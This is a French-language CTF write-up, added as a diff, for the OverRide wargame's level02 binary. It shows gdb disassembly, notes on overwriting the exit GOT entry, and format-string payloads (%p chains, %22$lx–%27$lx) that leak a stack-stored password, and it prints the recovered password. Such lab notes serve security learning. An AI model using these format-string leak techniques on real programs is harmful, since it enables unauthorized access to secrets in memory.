@@ -1,0 +1,180 @@
+level02@OverRide:~$ ls
+level02
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: ethan
+--[ Password: b
+*****************************************
+ethan does not have access!
+level02@OverRide:~$
+
+
+➜  override git:(main) ✗ scp -P 4242 level02@192.168.1.28:/home/users/level02/level02 ./bin/.
+
+
+decompilation 	https://dogbolt.org/
+
+peut etre remplacer exit dans la got par le saut sur
+ la partie du code qu'on souhaite 
+
+
+
+(gdb) set disassembly-flavor intel
+(gdb) disassemble main
+Dump of assembler code for function main:
+...
+   0x00000000004008e1 <+205>:   call   0x400710 <exit@plt>
+(gdb) disassemble 0x400710
+Dump of assembler code for function exit@plt:
+   0x0000000000400710 <+0>:     jmp    QWORD PTR [rip+0x200b12]        # 0x601228 <exit@got.plt>
+   0x0000000000400716 <+6>:     push   0xa
+   0x000000000040071b <+11>:    jmp    0x400660
+End of assembler dump.
+(gdb) x 0x601228
+0x601228 <exit@got.plt>:        0x00400716
+(gdb)
+
+donc je dois mettre l'adresse de la ou je veux sauter:
+   0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt>
+Soit 0x00400a8a dans l'adresse qui saute normalement a exit:
+0x00601228
+
+
+on peut utiliser 
+	fgets(s, 100, stdin);
+avec
+	printf(s);
+
+
+payload de 100 octets max 
+
+0x00400a8a
+
+4 adresse au debut surement 4 X 4 = 16 octets 
+3eme octet de l'adresse: 00 = 0
+4eme octet de l'adresse: 40 = 64
+2eme octet de l'adresse: 0a = 10
+1er octet de l'adresse: 8a = 138
+
+donc pas la place dans les 100 octets pour le format string
+
+mais je peux surement afficher le contenu du buffer dans 
+
+
+on veut recupere l'adresse de s et de ptr
+
+char s[100]; // [rsp+B0h] [rbp-70h] BYREF
+
+(gdb) b *0x00000000004008a8
+Breakpoint 1 at 0x4008a8
+(gdb) run
+Starting program: /home/users/level02/level02
+warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, 0x00000000004008a8 in main ()
+(gdb) print $rbp-0x70
+$1 = (void *) 0x7fffffffe560
+
+
+char ptr[48]; // [rsp+80h] [rbp-A0h] BYREF
+
+(gdb) print $rbp-0xa0
+$3 = (void *) 0x7fffffffe530
+
+aaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: aaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+--[ Password: *****************************************
+aaaa 0x7fffffffe4f0.(nil).0x70.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.(nil).(nil).0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x2e70252061616161.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70. does not have access!
+
+on retrouve nos aaaa 0x2e70252061616161
+
+
+aaaaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: aaaaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+--[ Password: *****************************************
+aaaaaa 0x7fffffffe4f0.(nil).0x2e.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70.(nil).0x100000000.(nil).0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d.(nil).0x2520616161616161.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e does not have access!
+
+si on en met plus "aaaaaa" on en a plus 0x2520616161616161 
+28 valeur afficher avant de tomber sur les a (61)
+
+
+
+0x7fffffffe530 %28$s
+
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: aaaa %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+--[ Password: A
+*****************************************
+aaaa 0x7fffffffe4f0.(nil).0x41.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe6e8.0x1f7ff9a08.0x41.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000. does not have access!
+
+le 'A' est afficher au 3eme %p 0x41 donc on peut s'en servir:
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: aa %3$s
+--[ Password: 0x7fffffffe530
+*****************************************
+Segmentation fault (core dumped)
+level02@OverRide:~$
+
+mais ca segfault
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: aa %3$p
+--[ Password: 0x7fffffffe530
+*****************************************
+aa 0x30 does not have access!
+level02@OverRide:~$
+
+
+
+on vas aller cherche le contenu de ptr a la main on sait que:
+- char ptr[48]; // [rsp+80h] [rbp-A0h] BYREF
+- a partir du 6eme arg de printf (%6$p) on attein la pile  (rsp)
+- ptr est a rsp+80h donc 80(hexa) == 128(dec) / 8(octets par bloc de pile)
+	16 + 6(argument avant la pile lue par printf) = 22
+- ptr fait 41 octets donc il faut (41/8(taille bloc)) +-= 6 bloc
+- donc de 22 a 27 (%22$lx %23$lx %24$lx %25$lx %26$lx %27$lx)
+
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx
+--[ Password: d
+*****************************************
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 does not have access!
+
+on utilise un script pour inverser les octets (litle endian)
+
+➜  override git:(main) ✗ python level02/ressources/script\ copy.py
+pass : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
